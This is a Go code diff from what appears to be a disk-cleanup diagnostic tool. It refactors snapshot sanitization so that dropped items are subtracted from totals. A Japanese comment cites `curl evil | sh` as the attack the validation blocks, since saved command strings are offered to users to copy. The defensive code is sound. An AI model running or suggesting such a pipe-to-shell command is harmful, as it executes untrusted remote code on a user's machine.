@@ -437,8 +437,7 @@ func loadDoctorSnapshotAny() (doctorSnapshot, bool) {
 	if err := json.Unmarshal(data, &sn); err != nil || sn.ScannedAt.IsZero() {
 		return doctorSnapshot{}, false
 	}
-	sn.Disk.Results = sanitizeSnapshotResults(sn.Disk.Results, timeNow())
-	sn.Disk.Total = disk.SumDeletable(sn.Disk.Results)
+	sn.Disk = sn.Disk.WithResults(sanitizeSnapshotResults(sn.Disk.Results, timeNow()))
 	// サービス節と brew 節も同じ境界を通す。サービスの Commands は「手で実行してください」と
 	// 提示して Y でコピーさせるので、保存された文字列をそのまま信じると `curl evil | sh` を
 	// コピー経路に載せられる (issue 178 の敵対レビューが再現した)
@@ -638,8 +637,8 @@ func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
 		// 崩れた Item は **その Item だけ落とし、合計を引き直す**。Result ごと落とすと
 		// パス 1 本の細工で 20GB のエントリが理由なく画面から消える (検査を足すほど消える範囲が
 		// 広がる)。Item 単位なら影響が局所に留まり、後から検査を足しやすい。
-		// 🚨 落としたら **Size を引き直す**。引かないと行の合計と Items の和が食い違い、
-		// 「消したのに減らない」に見える (合計は disk.SumDeletable が Result.Size を足す)
+		// 🚨 落とした分は合計からも引く (disk.Result.WithItems が引き直す)。引かないと行の合計と
+		// Items の和が食い違い、「消したのに減らない」に見える
 		kept := make([]disk.Item, 0, len(r.Items))
 		dropped := 0
 		for _, it := range r.Items {
@@ -650,12 +649,7 @@ func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
 			kept = append(kept, it)
 		}
 		if dropped > 0 {
-			var sum int64
-			for _, it := range kept {
-				sum += it.Size
-			}
-			r.Items = kept
-			r.Size = sum
+			r = r.WithItems(kept)
 			// 落としたことを人に見える形で残す (黙って消すと「昨日より減った」理由が分からない)。
 			// Failures はこの後 cleanOneLineList を通るので、ここでは素の文字列でよい
 			r.Failures = append(r.Failures,
